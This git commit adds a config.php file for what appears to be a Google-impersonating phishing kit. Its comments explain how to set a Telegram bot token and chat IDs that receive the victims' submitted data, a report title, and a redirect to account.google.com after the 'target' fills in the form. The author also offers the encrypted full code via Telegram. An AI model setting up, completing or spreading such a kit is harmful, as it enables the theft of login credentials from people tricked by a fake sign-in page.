0741f2af9975e185d8ef6626b1af1313284dcceb
anubiskun <adivian24@gmail.com>
2023-10-09 14:30:01 -0700

    UPDATE
    fix google image error and fix php missing error

---
+++ config.php
@@ -0,0 +1,30 @@
+<?php
+//===[Script By : anubiskun]===
+//===[website : anubis.6te.net]===
+//===[github : github.com/anubiskun]===
+//===[Telegram : t.me/anubiskun]===
+
+//don't change this file if you don't understand
+//to setup token and bot userid, it's in the connect.php file
+
+//to get full code without encrypt contact my telegram : t.me/anubiskun
+
+// $judulLaporan = di isi judul contoh "GOOGLE" nanti hasilnya ===[ LAPORAN GOOGLE ]
+// $chatIds = di isi chatid telegram mu, bingung? browsing google :v
+// $botToken = di isi token bot dari hasil pembuatan di botFather di telegram
+// $location = di isi url lokasi tujuan setelah form di isi oleh target
+// By Anubiskun https://anubis.6te.net/
+
+// title
+$judulLaporan = "GOOGLE";
+
+//botToken bot telegram get in @botfather
+$botToken = "TOKEN-BOT-TELEGRAM";
+
+//for multi userid use like this:
+//$chatIds = ["xxxx","xxxx","xxxx"];
+$chatIds = ["USER-ID-TELEGRAM"];
+
+//if click the login button it will be redirected to account.google.com, don't change it if you don't understand
+$location = "https://account.google.com";
+ ?>
